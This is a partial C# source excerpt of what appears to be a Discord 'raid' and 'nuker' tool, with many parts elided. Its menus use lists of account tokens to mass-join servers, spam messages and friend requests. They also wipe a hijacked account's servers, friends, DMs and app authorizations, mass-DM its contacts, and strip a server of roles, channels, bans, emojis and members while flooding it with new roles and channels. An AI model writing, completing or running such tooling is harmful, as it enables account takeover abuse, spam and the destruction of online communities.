                ...
                switch (option)
                {
                    ...
                    case 1:
                        try
                        {
                            ...
                            {
                                API.Raid.JoinGuild(joinguild, code);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                    ...
                    case 3:
                        try
                        {
                            ...
                            foreach (var token in clients)
                            {
                                API.Raid.AddFriend(token, user, discriminator);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                    ...
                    case 4:
                        try
                        {
                            ...
                            for (int i = 0; i < count; i++)
                            {
                                foreach (var token in clients)
                                {
                                    API.Raid.SendMessage(token, cid, msg);
                                }
                            }
                            DoneMethod5();
                        }
                    ...
                    case 5:
                        try
                        {
                            ...
                            if (choice == "1")
                            {
                                foreach (var token in clients)
                                {
                                    API.Raid.AddReaction(token, cid2, mid, "❤️");
                                }
                            }
                            if (choice == "2")
                            {
                    ...
                    case 10:
                        try
                        {
                            ...
                            foreach (var token in clients)
                            {
                                API.Raid.TriggerTyping(token, cid);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
        ...
        static void AccountNuker()
        {
            ...
            switch(option)
            {
                ...
                case 1:
                    ...
                    Console.Clear();
                    WriteLogo();
                    API.User.EditProfile(token, hypesquad, bio, status);
                    DoneMethod();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    API.User.LeaveDeleteGuilds(token);
                    DoneMethod();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    API.User.ClearRelationships(token);
                    DoneMethod();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    API.User.LeaveHypeSquad(token);
                    DoneMethod();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    API.User.RemoveConnections(token);
                    DoneMethod();
                    break;
                case 6:
                    Console.Clear();
                    WriteLogo();
                    API.User.DeauthorizeApps(token);
                    DoneMethod();
                    break;
                case 7:
                    try
                    {
                        ...
                        {
                            numb++;
                            API.User.CreateGuild(token, name);
                ...
                case 8:
                    try
                    {
                        ...
                        {
                            numb++;
                            API.User.ChangeTheme(token, "light");
                            API.User.ChangeTheme(token, "dark");
                ...
                case 10:
                    ...
                    Console.Clear();
                    WriteLogo();
                    API.User.MassDM(token, message);
                    DoneMethod();
                    break;
                case 11:
                    Console.Clear();
                    WriteLogo();
                    API.User.UserInformation(token);
                    AccountNuker();
                    break;
                case 12:
                    Console.Clear();
                    WriteLogo();
                    API.User.BlockRelationships(token);
                    DoneMethod();
                    break;
                case 13:
                    Console.Clear();
                    WriteLogo();
                    API.User.DeleteDMs(token);
                    DoneMethod();
                    break;
                case 14:
                    Console.Clear();
        ...
        static void ServerNuker()
        {
            ...
            switch(option)
            {
                ...
                case 1:
                    Console.Clear();
                    WriteLogo();
                    API.Server.DeleteRoles(token, guildid);
                    DoneMethod2();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    API.Server.RemoveBans(token, guildid);
                    DoneMethod2();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    API.Server.DeleteChannels(token, guildid);
                    DoneMethod2();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    API.Server.DeleteEmojis(token, guildid);
                    DoneMethod2();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    API.Server.DeleteInvites(token, guildid);
                    DoneMethod2();
                    break;
                case 6:
                    try
                    {
                        ...
                        for (int i = 0; i < count; i++)
                        {
                            ...
                            {
                                numb++;
                                API.Server.CreateRole(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                ...
                case 7:
                    try
                    {
                        ...
                        for (int i = 0; i < count; i++)
                        {
                            ...
                            {
                                numb++;
                                API.Server.CreateChannel(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                ...
                case 8:
                    Console.Clear();
                    WriteLogo();
                    API.Server.PruneMembers(token, guildid);
                    DoneMethod2();
                    break;
                case 9:
                    Console.Clear();
                    WriteLogo();
                    API.Server.RemoveIntegrations(token, guildid);
                    DoneMethod2();
                    break;
                case 10:
                    try
                ...
                case 11:
                    Console.Clear();
                    WriteLogo();
                    API.Server.ServerInformation(token, guildid);
                    ServerNuker();
                    break;
                case 12:
                    try
                    {
                        ...
                        Console.Clear();
                        WriteLogo();
                        API.Server.LeaveDeleteGuild(token, guildid, owner);
                        DoneMethod2();
                    }
                    catch { }
                    break;
                ...
                case 14:
                    Console.Clear();
                    WriteLogo();
                    API.Server.DeleteStickers(token, guildid);
                    DoneMethod2();
                    break;
                case 15:
                    try
